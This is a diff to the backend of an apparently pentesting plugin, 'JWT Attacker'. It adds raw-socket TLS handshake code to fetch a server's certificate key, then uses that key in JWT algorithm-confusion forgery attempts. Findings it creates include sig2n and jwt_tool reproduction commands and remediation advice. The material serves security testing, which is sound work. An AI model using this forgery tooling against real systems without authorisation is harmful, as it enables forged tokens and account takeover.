@@ -1,3 +1,55 @@
+// packages/backend/src/crypto/textCodecPolyfill.ts
+var g = globalThis;
+if (typeof g.TextEncoder === "undefined") {
+  g.TextEncoder = class {
+    encoding = "utf-8";
+    encode(str = "") {
+      const out = [];
+      for (let i = 0; i < str.length; i++) {
+        let c = str.charCodeAt(i);
+        if (c < 128) {
+          out.push(c);
+        } else if (c < 2048) {
+          out.push(192 | c >> 6, 128 | c & 63);
+        } else if (c >= 55296 && c <= 56319) {
+          const c2 = str.charCodeAt(++i);
+          c = 65536 + ((c & 1023) << 10) + (c2 & 1023);
+          out.push(240 | c >> 18, 128 | c >> 12 & 63, 128 | c >> 6 & 63, 128 | c & 63);
+        } else {
+          out.push(224 | c >> 12, 128 | c >> 6 & 63, 128 | c & 63);
+        }
+      }
+      return new Uint8Array(out);
+    }
+  };
+}
+if (typeof g.TextDecoder === "undefined") {
+  g.TextDecoder = class {
+    encoding = "utf-8";
+    decode(input) {
+      if (!input) return "";
+      const bytes = input instanceof Uint8Array ? input : new Uint8Array(ArrayBuffer.isView(input) ? input.buffer : input);
+      let str = "";
+      let i = 0;
+      while (i < bytes.length) {
+        const c = bytes[i++];
+        if (c < 128) {
+          str += String.fromCharCode(c);
+        } else if (c < 224) {
+          str += String.fromCharCode((c & 31) << 6 | bytes[i++] & 63);
+        } else if (c < 240) {
+          str += String.fromCharCode((c & 15) << 12 | (bytes[i++] & 63) << 6 | bytes[i++] & 63);
+        } else {
+          let cp = (c & 7) << 18 | (bytes[i++] & 63) << 12 | (bytes[i++] & 63) << 6 | bytes[i++] & 63;
+          cp -= 65536;
+          str += String.fromCharCode(55296 + (cp >> 10), 56320 + (cp & 1023));
+        }
+      }
+      return str;
+    }
+  };
+}
+
 // packages/backend/src/index.ts
 import { RequestSpec } from "caido:utils";
 
@@ -220,12 +272,12 @@ function gcdBig(a, b) {
 }
 function egcd(a, b) {
   if (b === 0n) return [a, 1n, 0n];
-  const [g, x, y] = egcd(b, a % b);
-  return [g, y, x - a / b * y];
+  const [g2, x, y] = egcd(b, a % b);
+  return [g2, y, x - a / b * y];
 }
 function modinv(a, m) {
-  const [g, x] = egcd((a % m + m) % m, m);
-  if (g !== 1n) throw new Error("modular inverse does not exist");
+  const [g2, x] = egcd((a % m + m) % m, m);
+  if (g2 !== 1n) throw new Error("modular inverse does not exist");
   return (x % m + m) % m;
 }
 function randomBigIntOfBits(bits) {
@@ -493,6 +545,38 @@ ${lines}
 -----END PUBLIC KEY-----
 `;
 }
+function publicKey2jwk(keyPem) {
+  const b64 = keyPem.replace(/-----[^-]+-----/g, "").replace(/\s/g, "");
+  const der = Buffer.from(b64, "base64");
+  let offset = 0;
+  if (der[offset] !== 48) throw new Error("Not a SPKI SEQUENCE");
+  offset++;
+  const { next: outerBody } = derReadLength(der, offset);
+  offset = outerBody;
+  offset = derSkip2(der, offset);
+  if (der[offset] !== 3) throw new Error("Expected BIT STRING");
+  offset++;
+  const { next: bsBody } = derReadLength(der, offset);
+  offset = bsBody + 1;
+  if (der[offset] !== 48) throw new Error("Expected RSAPublicKey SEQUENCE");
+  offset++;
+  const { next: rsakBody } = derReadLength(der, offset);
+  offset = rsakBody;
+  if (der[offset] !== 2) throw new Error("Expected INTEGER for n");
+  offset++;
+  const { len: nLen, next: nBody } = derReadLength(der, offset);
+  const nBuf = der.slice(nBody, nBody + nLen);
+  offset = nBody + nLen;
+  if (der[offset] !== 2) throw new Error("Expected INTEGER for e");
+  offset++;
+  const { len: eLen, next: eBody } = derReadLength(der, offset);
+  const eBuf = der.slice(eBody, eBody + eLen);
+  return {
+    kty: "RSA",
+    n: b64urlEncode(nBuf),
+    e: b64urlEncode(eBuf)
+  };
+}
 function jwksToPublicKeys(jwks) {
   const pems = [];
   for (const jwk of jwks.keys) {
@@ -509,10 +593,539 @@ function buildJWKSDocument(publicJwk, kid = "jwt-attacker-key") {
   };
 }
 
+// packages/backend/src/crypto/tlsConnect.ts
+import { connect } from "net";
+
+// packages/backend/src/crypto/tlsCert.ts
+import { createHmac as createHmac2, createHash as createHash2, createDecipheriv, randomBytes as randomBytes2 } from "crypto";
+var sleep = (ms) => new Promise((res) => {
+  const t = globalThis.setTimeout;
+  if (typeof t === "function") t(res, ms);
+  else res();
+});
+var asciiBytes = (s) => {
+  const out = [];
+  for (let i = 0; i < s.length; i++) out.push(s.charCodeAt(i) & 255);
+  return out;
+};
+var u16 = (n) => [n >> 8 & 255, n & 255];
+var u24 = (n) => [n >> 16 & 255, n >> 8 & 255, n & 255];
+var concat = (arrs) => {
+  let len = 0;
+  for (const a of arrs) len += a.length;
+  const out = new Uint8Array(len);
+  let o = 0;
+  for (const a of arrs) {
+    out.set(a, o);
+    o += a.length;
+  }
+  return out;
+};
+var P25519 = (1n << 255n) - 19n;
+function powmod(b, e, m) {
+  let r = 1n;
+  b %= m;
+  while (e > 0n) {
+    if (e & 1n) r = r * b % m;
+    e >>= 1n;
+    b = b * b % m;
+  }
+  return r;
+}
+function decodeLE(b) {
+  let n = 0n;
+  for (let i = b.length - 1; i >= 0; i--) n = n << 8n | BigInt(b[i]);
+  return n;
+}
+function encodeLE(n) {
+  const o = new Uint8Array(32);
+  for (let i = 0; i < 32; i++) {
+    o[i] = Number(n & 0xffn);
+    n >>= 8n;
+  }
+  return o;
+}
+function x25519(scalar, uBytes) {
+  const k = scalar.slice();
+  k[0] &= 248;
+  k[31] &= 127;
+  k[31] |= 64;
+  const kBig = decodeLE(k);
+  let u = decodeLE(uBytes) & (1n << 255n) - 1n;
+  let x1 = u, x2 = 1n, z2 = 0n, x3 = u, z3 = 1n, swap = 0n;
+  const a24 = 121665n;
+  const cswap = (s, a, b) => {
+    const d = s * ((a - b + P25519) % P25519) % P25519;
+    return [(a - d + P25519) % P25519, (b + d) % P25519];
+  };
+  for (let t = 254; t >= 0; t--) {
+    const kt = kBig >> BigInt(t) & 1n;
+    swap ^= kt;
+    [x2, x3] = cswap(swap, x2, x3);
+    [z2, z3] = cswap(swap, z2, z3);
+    swap = kt;
+    const A = (x2 + z2) % P25519, AA = A * A % P25519;
+    const B = (x2 - z2 + P25519) % P25519, BB = B * B % P25519;
+    const E = (AA - BB + P25519) % P25519;
+    const C = (x3 + z3) % P25519, D = (x3 - z3 + P25519) % P25519;
+    const DA = D * A % P25519, CB = C * B % P25519;
+    x3 = ((DA + CB) % P25519) ** 2n % P25519;
+    z3 = x1 * (((DA - CB + P25519) % P25519) ** 2n % P25519) % P25519;
+    x2 = AA * BB % P25519;
+    z2 = E * ((AA + a24 * E % P25519) % P25519) % P25519;
+  }
+  [x2, x3] = cswap(swap, x2, x3);
+  [z2, z3] = cswap(swap, z2, z3);
+  const res = x2 * powmod(z2, P25519 - 2n, P25519) % P25519;
+  return encodeLE(res);
+}
+var X25519_BASE = (() => {
+  const b = new Uint8Array(32);
+  b[0] = 9;
+  return b;
+})();
+var hmacSha256 = (key, data) => new Uint8Array(createHmac2("sha256", Buffer.from(key)).update(Buffer.from(data)).digest());
+var sha256 = (data) => new Uint8Array(createHash2("sha256").update(Buffer.from(data)).digest());
+function hkdfExpand(prk, info, length) {
+  const out = [];
+  let t = new Uint8Array(0);
+  let i = 1;
+  while (out.length < length) {
+    t = hmacSha256(prk, concat([t, info, new Uint8Array([i])]));
+    for (const b of t) out.push(b);
+    i++;
+  }
+  return new Uint8Array(out.slice(0, length));
+}
+function hkdfExpandLabel(secret, label, context, length) {
+  const full = new Uint8Array(asciiBytes("tls13 " + label));
+  const info = concat([
+    new Uint8Array(u16(length)),
+    new Uint8Array([full.length]),
+    full,
+    new Uint8Array([context.length]),
+    context
+  ]);
+  return hkdfExpand(secret, info, length);
+}
+function buildClientHello12(host) {
+  const sni = asciiBytes(host);
+  const random = [];
+  for (let i = 0; i < 32; i++) random.push(Math.floor(Math.random() * 256));
+  const cipherSuites = [
+    192,
+    47,
+    192,
+    48,
+    192,
+    43,
+    192,
+    44,
+    192,
+    19,
+    192,
+    20,
+    0,
+    156,
+    0,
+    157,
+    0,
+    47,
+    0,
+    53,
+    0,
+    255
+  ];
+  const exts = [];
+  const pushExt = (type, data) => exts.push(...u16(type), ...u16(data.length), ...data);
+  const nameEntry = [0, ...u16(sni.length), ...sni];
+  pushExt(0, [...u16(nameEntry.length), ...nameEntry]);
+  pushExt(10, [...u16(6), 0, 29, 0, 23, 0, 24]);
+  pushExt(11, [1, 0]);
+  pushExt(13, [...u16(20), 4, 1, 5, 1, 6, 1, 4, 3, 5, 3, 6, 3, 8, 4, 8, 5, 8, 6, 2, 1]);
+  const body = [3, 3, ...random, 0, ...u16(cipherSuites.length), ...cipherSuites, 1, 0, ...u16(exts.length), ...exts];
+  const hs = [1, ...u24(body.length), ...body];
+  return new Uint8Array([22, 3, 1, ...u16(hs.length), ...hs]);
+}
+function extractCertDER12(buf) {
+  const hs = [];
+  let i = 0;
+  while (i + 5 <= buf.length) {
+    const type = buf[i];
+    const len = buf[i + 3] << 8 | buf[i + 4];
+    if (i + 5 + len > buf.length) break;
+    const payload = buf.subarray(i + 5, i + 5 + len);
+    if (type === 21) throw new Error(`alert level ${payload[0]} desc ${payload[1]}`);
+    if (type === 22) for (let k = 0; k < payload.length; k++) hs.push(payload[k]);
+    i += 5 + len;
+  }
+  let j = 0;
+  while (j + 4 <= hs.length) {
+    const hsType = hs[j];
+    const hsLen = hs[j + 1] << 16 | hs[j + 2] << 8 | hs[j + 3];
+    if (j + 4 + hsLen > hs.length) break;
+    if (hsType === 11) {
+      let k = j + 4 + 3;
+      if (k + 3 > hs.length) return null;
+      const certLen = hs[k] << 16 | hs[k + 1] << 8 | hs[k + 2];
+      k += 3;
+      if (k + certLen > hs.length) return null;
+      return new Uint8Array(hs.slice(k, k + certLen));
+    }
+    j += 4 + hsLen;
+  }
+  return null;
+}
+async function fetchServerCertDER12(conn, host, log, maxReads = 40) {
+  const ch = buildClientHello12(host);
+  try {
+    await conn.send(Array.from(ch));
+  } catch (e) {
+    log(`TLS1.2: send failed: ${e.message}`);
+    return null;
+  }
+  const hasTimer = typeof globalThis.setTimeout === "function";
+  log(`TLS1.2: sent ClientHello (${ch.length} B); reading response (setTimeout ${hasTimer ? "ok" : "MISSING \u2014 retries won't pause"})\u2026`);
+  let buf = new Uint8Array(0);
+  let empties = 0;
+  let loggedVer = false;
+  for (let r = 0; r < maxReads; r++) {
+    let chunk;
+    try {
+      chunk = await conn.receive(16384);
+    } catch (e) {
+      log(`TLS1.2: receive error: ${e.message}`);
+      break;
+    }
+    if (r < 4) log(`TLS1.2: read #${r} \u2192 ${chunk ? chunk.length : 0} B`);
+    if (!chunk || chunk.length === 0) {
+      empties++;
+      if (empties > 20) {
+        log(`TLS1.2: no response after ${empties} empty reads (${buf.length} B) \u2014 server closed/ignored the ClientHello`);
+        break;
+      }
+      await sleep(150);
+      continue;
+    }
+    empties = 0;
+    buf = concat([buf, chunk]);
+    if (!loggedVer && buf.length >= 11 && buf[0] === 22) {
+      log(`TLS1.2: received ${buf.length} B; ServerHello server_version=0x${(buf[9] << 8 | buf[10]).toString(16)}`);
+      loggedVer = true;
+    }
+    try {
+      const cert = extractCertDER12(buf);
+      if (cert) {
+        log(`TLS1.2: got certificate (${cert.length} B)`);
+        return cert;
+      }
+    } catch (e) {
+      log(`TLS1.2: ${e.message}`);
+      return null;
+    }
+    if (buf.length > 262144) break;
+  }
+  if (buf.length) log(`TLS1.2: no plaintext Certificate in ${buf.length} B (server may be TLS 1.3-only)`);
+  return null;
+}
+function buildClientHello13(host, pub) {
+  const sni = asciiBytes(host);
+  const random = [];
+  for (let i = 0; i < 32; i++) random.push(Math.floor(Math.random() * 256));
+  const sessId = [];
+  for (let i = 0; i < 32; i++) sessId.push(Math.floor(Math.random() * 256));
+  const cipherSuites = [19, 1];
+  const exts = [];
+  const pushExt = (type, data) => exts.push(...u16(type), ...u16(data.length), ...data);
+  const nameEntry = [0, ...u16(sni.length), ...sni];
+  pushExt(0, [...u16(nameEntry.length), ...nameEntry]);
+  pushExt(10, [...u16(2), 0, 29]);
+  pushExt(13, [...u16(8), 4, 3, 8, 4, 4, 1, 2, 1]);
+  pushExt(43, [2, 3, 4]);
+  pushExt(51, [...u16(36), 0, 29, ...u16(32), ...Array.from(pub)]);
+  const body = [3, 3, ...random, sessId.length, ...sessId, ...u16(cipherSuites.length), ...cipherSuites, 1, 0, ...u16(exts.length), ...exts];
+  const hs = new Uint8Array([1, ...u24(body.length), ...body]);
+  const record = new Uint8Array([22, 3, 1, ...u16(hs.length), ...hs]);
+  return { record, handshake: hs };
+}
+function tryExtractCert13(buf, st, log) {
+  let serverHelloHs = null;
+  const encRecords = [];
+  let i = 0;
+  while (i + 5 <= buf.length) {
+    const type = buf[i];
+    const len = buf[i + 3] << 8 | buf[i + 4];
+    if (i + 5 + len > buf.length) break;
+    const header = buf.subarray(i, i + 5);
+    const payload = buf.subarray(i + 5, i + 5 + len);
+    if (type === 21) throw new Error(`alert level ${payload[0]} desc ${payload[1]}`);
+    if (type === 22 && !serverHelloHs) serverHelloHs = payload.slice();
+    else if (type === 23) encRecords.push({ header: header.slice(), payload: payload.slice() });
+    i += 5 + len;
+  }
+  if (!serverHelloHs) return null;
+  const serverPub = parseServerHelloKeyShare(serverHelloHs);
+  if (!serverPub) throw new Error("ServerHello has no x25519 key_share (HelloRetryRequest or unsupported group)");
+  const shared = x25519(st.priv, serverPub);
+  const zeros = new Uint8Array(32);
+  const earlySecret = hkdfExtract(zeros, zeros);
+  const derived = hkdfExpandLabel(earlySecret, "derived", sha256(new Uint8Array(0)), 32);
+  const handshakeSecret = hkdfExtract(derived, shared);
+  const transcript = sha256(concat([st.clientHelloHs, serverHelloHs]));
+  const sHs = hkdfExpandLabel(handshakeSecret, "s hs traffic", transcript, 32);
+  const key = hkdfExpandLabel(sHs, "key", new Uint8Array(0), 16);
+  const iv = hkdfExpandLabel(sHs, "iv", new Uint8Array(0), 12);
+  const hs = [];
+  for (let s = 0; s < encRecords.length; s++) {
+    let plain;
+    try {
+      plain = aesGcmDecrypt(key, iv, BigInt(s), encRecords[s].header, encRecords[s].payload);
+    } catch {
+      return null;
+    }
+    let end = plain.length - 1;
+    while (end >= 0 && plain[end] === 0) end--;
+    if (end < 0) continue;
+    const ctype = plain[end];
+    if (ctype === 22) for (let k = 0; k < end; k++) hs.push(plain[k]);
+    else if (ctype === 21) throw new Error(`encrypted alert ${plain[end - 1]}/${plain[end > 0 ? end - 1 : 0]}`);
+  }
+  let j = 0;
+  while (j + 4 <= hs.length) {
+    const hsType = hs[j];
+    const hsLen = hs[j + 1] << 16 | hs[j + 2] << 8 | hs[j + 3];
+    if (j + 4 + hsLen > hs.length) break;
+    if (hsType === 11) {
+      let k = j + 4;
+      const ctxLen = hs[k];
+      k += 1 + ctxLen;
+      k += 3;
+      if (k + 3 > hs.length) return null;
+      const certLen = hs[k] << 16 | hs[k + 1] << 8 | hs[k + 2];
+      k += 3;
+      if (k + certLen > hs.length) return null;
+      return new Uint8Array(hs.slice(k, k + certLen));
+    }
+    j += 4 + hsLen;
+  }
+  return null;
+}
+function parseServerHelloKeyShare(sh) {
+  let p = 4 + 2 + 32;
+  const sidLen = sh[p];
+  p += 1 + sidLen;
+  p += 2 + 1;
+  const extLen = sh[p] << 8 | sh[p + 1];
+  p += 2;
+  const end = p + extLen;
+  while (p + 4 <= end) {
+    const type = sh[p] << 8 | sh[p + 1];
+    const len = sh[p + 2] << 8 | sh[p + 3];
+    p += 4;
+    if (type === 51) {
+      const group = sh[p] << 8 | sh[p + 1];
+      const klen = sh[p + 2] << 8 | sh[p + 3];
+      if (group === 29 && klen === 32) return sh.slice(p + 4, p + 4 + 32);
+      return null;
+    }
+    p += len;
+  }
+  return null;
+}
+function hkdfExtract(salt, ikm) {
+  return hmacSha256(salt, ikm);
+}
+function aesGcmDecrypt(key, iv, seq, aad, payload) {
+  const nonce = iv.slice();
+  for (let i = 0; i < 8; i++) nonce[11 - i] ^= Number(seq >> BigInt(8 * i) & 0xffn);
+  const tag = payload.subarray(payload.length - 16);
+  const ct = payload.subarray(0, payload.length - 16);
+  const d = createDecipheriv("aes-128-gcm", Buffer.from(key), Buffer.from(nonce));
+  d.setAAD(Buffer.from(aad));
+  d.setAuthTag(Buffer.from(tag));
+  return new Uint8Array(Buffer.concat([d.update(Buffer.from(ct)), d.final()]));
+}
+async function fetchServerCertDER13(conn, host, log, maxReads = 40) {
+  const priv = new Uint8Array(randomBytes2(32));
+  const pub = x25519(priv, X25519_BASE);
+  const { record, handshake } = buildClientHello13(host, pub);
+  const st = { priv, clientHelloHs: handshake };
+  try {
+    await conn.send(Array.from(record));
+  } catch (e) {
+    log(`TLS1.3: send failed: ${e.message}`);
+    return null;
+  }
+  log(`TLS1.3: sent ClientHello (${record.length} B, x25519 key_share)`);
+  let buf = new Uint8Array(0);
+  let empties = 0;
+  for (let r = 0; r < maxReads; r++) {
+    let chunk;
+    try {
+      chunk = await conn.receive(16384);
+    } catch (e) {
+      log(`TLS1.3: receive error: ${e.message}`);
+      break;
+    }
+    if (!chunk || chunk.length === 0) {
+      empties++;
+      if (empties === 1) log(`TLS1.3: awaiting server response\u2026`);
+      if (empties > 12) {
+        log(`TLS1.3: no response after ${empties} reads (${buf.length} B)`);
+        break;
+      }
+      await sleep(150);
+      continue;
+    }
+    empties = 0;
+    buf = concat([buf, chunk]);
+    try {
+      const cert = tryExtractCert13(buf, st, log);
+      if (cert) {
+        log(`TLS1.3: decrypted Certificate (${cert.length} B)`);
+        return cert;
+      }
+    } catch (e) {
+      log(`TLS1.3: ${e.message}`);
+      return null;
+    }
+    if (buf.length > 262144) break;
+  }
+  if (buf.length) log(`TLS1.3: no Certificate recovered from ${buf.length} B`);
+  return null;
+}
+function certDERToPublicKeyPem(der) {
+  const b64 = Buffer.from(der).toString("base64");
+  const pem = `-----BEGIN CERTIFICATE-----
+${b64.match(/.{1,64}/g).join("\n")}
+-----END CERTIFICATE-----
+`;
+  return x509CertToPublicKeyPem(pem);
+}
+function publicKeyPemToModulusHex(pem) {
+  try {
+    const jwk = publicKey2jwk(pem);
+    if (jwk.kty !== "RSA" || !jwk.n) return null;
+    const b64 = jwk.n.replace(/-/g, "+").replace(/_/g, "/") + "===".slice((jwk.n.length + 3) % 4);
+    let hex = Buffer.from(b64, "base64").toString("hex").replace(/^0+/, "");
+    if (hex.length % 2) hex = "0" + hex;
+    return hex || null;
+  } catch {
+    return null;
+  }
+}
+async function fetchTlsPublicKeyOverConns(newConn, host, log = () => {
+}) {
+  let der = null;
+  let c1;
+  try {
+    log(`connecting to ${host} (raw socket) for TLS 1.2\u2026`);
+    c1 = await newConn();
+    der = await fetchServerCertDER12(c1, host, log);
+  } catch (e) {
+    log(`TLS1.2: connect/handshake failed: ${e.message}`);
+  } finally {
+    try {
+      c1?.close?.();
+    } catch {
+    }
+  }
+  if (!der) {
+    let c2;
+    try {
+      log(`retrying over TLS 1.3\u2026`);
+      c2 = await newConn();
+      der = await fetchServerCertDER13(c2, host, log);
+    } catch (e) {
+      log(`TLS1.3: connect/handshake failed: ${e.message}`);
+    } finally {
+      try {
+        c2?.close?.();
+      } catch {
+      }
+    }
+  }
+  if (!der) return null;
+  const publicKeyPem = certDERToPublicKeyPem(der);
+  return { publicKeyPem, nHex: publicKeyPemToModulusHex(publicKeyPem) };
+}
+
+// packages/backend/src/crypto/tlsConnect.ts
+function openConn(host, port) {
+  return new Promise((resolve, reject) => {
+    let settled = false;
+    const sock = connect(port, host);
+    let buf = Buffer.alloc(0);
+    let ended = false;
+    const waiters = [];
+    const flush = () => {
+      while (waiters.length && (buf.length || ended)) {
+        const w = waiters.shift();
+        const out = buf;
+        buf = Buffer.alloc(0);
+        w(new Uint8Array(out));
+      }
+    };
+    sock.on("data", (d) => {
+      buf = buf.length ? Buffer.concat([buf, d]) : d;
+      flush();
+    });
+    sock.on("end", () => {
+      ended = true;
+      flush();
+    });
+    sock.on("close", () => {
+      ended = true;
+      flush();
+    });
+    sock.on("error", (e) => {
+      ended = true;
+      flush();
+      if (!settled) {
+        settled = true;
+        reject(e);
+      }
+    });
+    sock.once("connect", () => {
+      if (settled) return;
+      settled = true;
+      resolve({
+        // Node's write buffers and flushes; fire-and-forget is fine for our small
+        // handshake records.
+        send: (bytes) => {
+          try {
+            sock.write(Buffer.from(bytes));
+          } catch {
+          }
+          return Promise.resolve();
+        },
+        // Resolve with buffered bytes, or wait for the next 'data'/'end' event.
+        receive: () => new Promise((res) => {
+          if (buf.length || ended) {
+            const out = buf;
+            buf = Buffer.alloc(0);
+            res(new Uint8Array(out));
+          } else waiters.push(res);
+        }),
+        close: () => {
+          try {
+            sock.destroy();
+          } catch {
+          }
+        }
+      });
+    });
+  });
+}
+async function fetchTlsPublicKey(host, port, log = () => {
+}) {
+  return fetchTlsPublicKeyOverConns(() => openConn(host, port), host, log);
+}
+
 // packages/backend/src/util.ts
-import { randomBytes as randomBytes2 } from "crypto";
+import { randomBytes as randomBytes3 } from "crypto";
 function nanoid(size = 12) {
-  return randomBytes2(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
+  return randomBytes3(size).toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "").slice(0, size);
 }
 function parseCookies(cookieHeader) {
   const cookies = {};
@@ -1662,6 +2275,7 @@ async function attackJwt(sdk, requestId, config) {
         }
       }
     }
+    let tlsKey = null;
     if (cfg.enabledAttacks.algConfusion) {
       const isAsym = /^(RS|PS|ES)/.test(parsed.header.alg);
       if (!isAsym) {
@@ -1694,6 +2308,47 @@ async function attackJwt(sdk, requestId, config) {
           sessionId,
           message: foundCount > 0 ? `Algorithm confusion: found ${foundCount} key endpoint(s) \u2014 see the cyan banner.` : `Algorithm confusion: no exposed JWKS/cert endpoints found on ${request.getHost()} (expected for "no exposed key" targets \u2014 use key recovery).`
         });
+        if (request.getTls()) {
+          sdk.api.send("jwt-key-recovery-progress", {
+            sessionId,
+            message: "Algorithm confusion: fetching the web server's TLS certificate public key\u2026"
+          });
+          try {
+            tlsKey = await fetchTlsPublicKey(
+              request.getHost(),
+              request.getPort(),
+              (m) => sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `[TLS] ${m}` })
+            );
+          } catch {
+            tlsKey = null;
+          }
+          if (tlsKey?.publicKeyPem) {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: got the TLS public key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : " (non-RSA)"} \u2014 trying it as the HMAC secret.`
+            });
+            const tlsAttacks = buildAlgConfusionForKeys(parsed, [tlsKey.publicKeyPem], "webserver TLS certificate");
+            attacks.push(...tlsAttacks);
+          } else {
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: "Algorithm confusion: could not auto-fetch the TLS certificate (raw socket blocked in this runtime). Paste it into Configuration \u2192 Certificate to use it (get it via: openssl s_client -connect HOST:443 -servername HOST </dev/null | openssl x509)."
+            });
+          }
+        }
+        if (!tlsKey?.publicKeyPem && cfg.customCertPem) {
+          try {
+            const pem = x509CertToPublicKeyPem(cfg.customCertPem);
+            tlsKey = { publicKeyPem: pem, nHex: publicKeyPemToModulusHex(pem) };
+            sdk.api.send("jwt-key-recovery-progress", {
+              sessionId,
+              message: `Algorithm confusion: using the configured Certificate as the web server's TLS key${tlsKey.nHex ? ` (RSA, ${tlsKey.nHex.length * 4}-bit)` : ""}.`
+            });
+            attacks.push(...buildAlgConfusionForKeys(parsed, [pem], "configured TLS certificate"));
+          } catch (e) {
+            sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Could not parse the configured Certificate: ${e.message}` });
+          }
+        }
       }
     }
     sdk.console.log(`[JWT Attacker] built ${attacks.length} attack variant(s)`);
@@ -1838,6 +2493,45 @@ ${repro}
       }
     };
     await runBypassFindings(attacks);
+    if (sigValidated && tlsKey?.publicKeyPem) {
+      const hit = attacks.find(
+        (a) => a.keyPem === tlsKey.publicKeyPem && !a.infoOnly && !a.error && matchesBaseline(a)
+      );
+      const sent = hit ? sentById.get(hit.id) : void 0;
+      if (hit && sent?.request) {
+        const fullTok = (j) => `${j.headerB64}.${j.payloadB64}.${j.signatureB64}`;
+        const jwt1 = recoveryCandidates[0] ? fullTok(recoveryCandidates[0]) : "<JWT-token1>";
+        const jwt2 = recoveryCandidates[1] ? fullTok(recoveryCandidates[1]) : "<JWT-token2>";
+        const title = "JWT signed using webserver's TLS public key";
+        try {
+          await sdk.findings.create({
+            title,
+            reporter: "JWT Attacker",
+            dedupeKey: `jwt-attacker:tls-public-key:${sent.request.getHost()}${sent.request.getPath()}`,
+            request: sent.request,
+            description: `**${title}.**
+
+The server accepts JWTs HMAC-signed (HS256) with its TLS certificate **public** key \u2014 its JWT verification key is the TLS public key and it is vulnerable to algorithm confusion. Because the TLS public key is available to anyone (it's in the server's certificate), an attacker can forge arbitrary tokens (e.g. elevated claims) with no secret material.
+
+**REPRODUCE WITH SIG2N and JWT_TOOL:**
+
+\`\`\`
+` + buildTlsCompareRepro({
+              host: request.getHost(),
+              port: request.getPort(),
+              jwt1,
+              jwt2,
+              b64x509: pemToB64(tlsKey.publicKeyPem),
+              originalJWT,
+              includeForge: true
+            }) + "\n```"
+          });
+          sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Finding created: "${title}".` });
+        } catch (e) {
+          errors.push(`[finding] ${e.message}`);
+        }
+      }
+    }
     if (cfg.enabledAttacks.algConfusion && cfg.enableKeyRecovery) {
       const historyJWTs = recoveryCandidates;
       sdk.api.send("jwt-key-recovery-progress", {
@@ -1858,6 +2552,7 @@ ${repro}
           sessionId,
           requestId,
           originalJWT,
+          tlsModulusHex: tlsKey?.nHex ?? null,
           candidates: historyJWTs.map((j) => ({
             alg: j.header.alg,
             headerB64: j.headerB64,
@@ -1881,6 +2576,16 @@ async function getJWTsInRequest(sdk, requestId) {
   if (!reqResp) return [];
   return findJWTsInSpec(reqResp.request.toSpec());
 }
+async function netSelfTest(_sdk) {
+  const out = [];
+  try {
+    const key = await fetchTlsPublicKey("example.com", 443, (m) => out.push(`  ${m}`));
+    out.push(key ? `\u2713 Fetched example.com TLS cert \u2014 public key ${key.nHex ? `RSA ${key.nHex.length * 4}-bit` : "(non-RSA)"}.` : "\u2717 Could not fetch example.com's certificate (see lines above).");
+  } catch (e) {
+    out.push(`\u2717 net test threw: ${e.message}`);
+  }
+  return { message: out.join("\n") };
+}
 async function generateSpoofKeyPair(_sdk) {
   const kp = generateRSAKeyPair(2048);
   const jwks = buildJWKSDocument({ ...kp.publicJwk, kid: SPOOF_KID }, SPOOF_KID);
@@ -1897,6 +2602,45 @@ async function runRecoveredConfusion(sdk, requestId, keys, sessionId, opts) {
   const loc = locations[0];
   const parsed = parseJWT(loc.jwt);
   const originalJWT = loc.jwt;
+  const req = reqResp.request;
+  if (opts?.tlsModulusHex) {
+    const match = keys.find((k) => normalizeHex(k.nHex) === normalizeHex(opts.tlsModulusHex));
+    if (match) {
+      const jwt12 = opts.candidateJwts?.[0] ?? "<JWT-token1>";
+      const jwt22 = opts.candidateJwts?.[1] ?? "<JWT-token2>";
+      const b64 = pemToB64(bigintToPublicKeyPem(BigInt("0x" + match.nHex), BigInt(match.e)));
+      const title = "JWT signed using webserver's TLS private key";
+      try {
+        await sdk.findings.create({
+          title,
+          reporter: "JWT Attacker",
+          dedupeKey: `jwt-attacker:tls-private-key:${req.getHost()}${req.getPath()}`,
+          request: reqResp.request,
+          description: `**${title}.**
+
+The RSA public key recovered from the JWTs matches the web server's TLS certificate public key. Because RS256 tokens are produced with the PRIVATE key, the server is signing JWTs with its **TLS private key**.
+
+**Risk \u2014 TLS confidentiality & integrity:** the TLS private key is now used outside the TLS stack, behind a weaker boundary (the JWT-signing service). If that key is exposed or compromised via the JWT path, an attacker who obtains it can, from a **Machine-in-the-Middle (MITM)** position, decrypt and tamper with ALL TLS traffic to this server \u2014 breaking both the confidentiality and integrity of every TLS session \u2014 as well as forge arbitrary JWTs. A TLS private key must be unique to TLS and never reused for application token signing; rotate the TLS certificate/key and use a separate key for JWTs.
+
+**REPRODUCE WITH SIG2N and JWT_TOOL:**
+
+\`\`\`
+` + buildTlsCompareRepro({
+            host: req.getHost(),
+            port: req.getPort(),
+            jwt1: jwt12,
+            jwt2: jwt22,
+            b64x509: b64,
+            originalJWT,
+            includeForge: true
+          }) + "\n```"
+        });
+        sdk.api.send("jwt-key-recovery-progress", { sessionId, message: `Finding created: "${title}".` });
+      } catch (e) {
+        sdk.console.log(`[JWT Attacker] tls-private-key finding failed: ${e.message}`);
+      }
+    }
+  }
   const extra = buildAlgConfusionForKeys(parsed, pems, "recovered from HTTP history (frontend gmp-wasm)");
   for (const a of extra) if (!a.originalJWT) a.originalJWT = originalJWT;
   sdk.api.send("jwt-key-recovery-complete", { sessionId, keys: pems });
@@ -1965,6 +2709,36 @@ function jwksContainsKey(hostedRaw, expectedRaw) {
   } catch {
     return false;
   }
+}
+function normalizeHex(h) {
+  if (!h) return "";
+  return h.toLowerCase().replace(/^0+/, "");
+}
+function pemToB64(pem) {
+  return pem.replace(/-----[^-]+-----/g, "").replace(/\s+/g, "");
+}
+function buildTlsCompareRepro(o) {
+  const lines = [
+    "# Recover the JWT signing public key from two captured JWTs (silentsignal rsa_sign2n):",
+    `docker run --rm -it portswigger/sig2n ${o.jwt1} ${o.jwt2}`,
+    "# sig2n prints base64 X.509 key(s); write the matching one to a file:",
+    `echo -n ${o.b64x509} | base64 -d > /tmp/recoveredkey`,
+    "",
+    "# Extract the web server's TLS certificate public key (SPKI DER):",
